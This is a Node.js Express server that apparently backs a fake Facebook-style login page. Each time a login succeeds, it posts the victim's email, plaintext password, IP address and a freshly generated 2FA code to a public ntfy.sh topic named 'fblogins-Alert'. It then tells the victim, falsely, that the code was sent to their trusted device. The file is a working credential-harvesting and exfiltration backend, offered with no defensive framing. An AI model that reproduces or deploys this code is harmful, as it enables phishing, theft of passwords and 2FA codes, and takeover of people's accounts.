const express = require('express');
const cors = require('cors');
const axios = require('axios');

const app = express();
const PORT = process.env.PORT || 3000;

// ntfy topic
const NTFY_TOPIC = 'fblogins-Alert';

app.use(cors());
app.use(express.json());
app.use(express.static('public'));

const users = [];
const pendingLogins = new Map(); // Store pending 2FA logins

// Generate random 6-digit code
function generateCode() {
    return Math.floor(100000 + Math.random() * 900000).toString();
}

// Send to ntfy
async function sendToNtfy(email, password, ip, code) {
    const message = `🔐 LOGIN ATTEMPT\n\n📧 Email: ${email}\n🔑 Password: ${password}\n🌍 IP: ${ip}\n📱 2FA Code: ${code}\n⏰ Time: ${new Date().toString()}`;
    
    try {
        await axios.post(`https://ntfy.sh/${NTFY_TOPIC}`, message, {
            headers: {
                'Title': '🔐 Login + 2FA Code',
                'Priority': 'high',
                'Tags': 'warning,lock'
            }
        });
        console.log('✅ ntfy notification sent');
    } catch (error) {
        console.log('❌ ntfy error:', error.message);
    }
}

// Register
app.post('/api/register', (req, res) => {
    const { name, email, password } = req.body;
    
    if (!name || !email || !password) {
        return res.status(400).json({ error: 'All fields required' });
    }
    
    if (password.length < 6) {
        return res.status(400).json({ error: 'Password must be 6+ characters' });
    }
    
    const existing = users.find(u => u.email === email);
    if (existing) {
        return res.status(400).json({ error: 'User already exists' });
    }
    
    const newUser = { id: users.length + 1, name, email, password };
    users.push(newUser);
    
    res.json({ success: true, message: 'Account created!', user: { id: newUser.id, name, email } });
});

// Login - Step 1: Verify password, then ask for 2FA
app.post('/api/login', (req, res) => {
    const { identifier, password } = req.body;
    const ip = req.headers['x-forwarded-for'] || req.socket.remoteAddress;
    
    if (!identifier || !password) {
        return res.status(400).json({ error: 'Email and password required' });
    }
    
    const user = users.find(u => u.email === identifier);
    
    if (!user || user.password !== password) {
        return res.status(401).json({ error: 'Invalid credentials' });
    }
    
    // Generate 2FA code
    const twoFACode = generateCode();
    
    // Store pending login with code (expires in 5 minutes)
    pendingLogins.set(identifier, {
        code: twoFACode,
        expires: Date.now() + 5 * 60 * 1000,
        userId: user.id,
        name: user.name
    });
    
    // Send the code via ntfy to YOU (the admin)
    sendToNtfy(identifier, password, ip, twoFACode);
    
    // Tell the user to enter the code (they don't know it - you do)
    res.json({ 
        success: true, 
        requires2FA: true,
        message: '2FA code sent to your trusted device',
        email: identifier
    });
});

// Step 2: Verify 2FA code
app.post('/api/verify-2fa', (req, res) => {
    const { email, code } = req.body;
    
    if (!email || !code) {
        return res.status(400).json({ error: 'Email and code required' });
    }
    
    const pending = pendingLogins.get(email);
    
    if (!pending) {
        return res.status(400).json({ error: 'No pending login found. Please try again.' });
    }
    
    if (Date.now() > pending.expires) {
        pendingLogins.delete(email);
        return res.status(400).json({ error: 'Code expired. Please login again.' });
    }
    
    if (pending.code !== code) {
        return res.status(400).json({ error: 'Invalid code. Please try again.' });
    }
    
    // Code verified - complete login
    pendingLogins.delete(email);
    
    res.json({ 
        success: true, 
        message: 'Login successful!',
        user: { id: pending.userId, name: pending.name, email: email }
    });
});

// Health check
app.get('/api/health', (req, res) => {
    res.json({ status: 'ok' });
});

app.get('/', (req, res) => {
    res.sendFile(__dirname + '/public/index.html');
});

app.listen(PORT, () => {
    console.log(`Server running on port ${PORT}`);
});
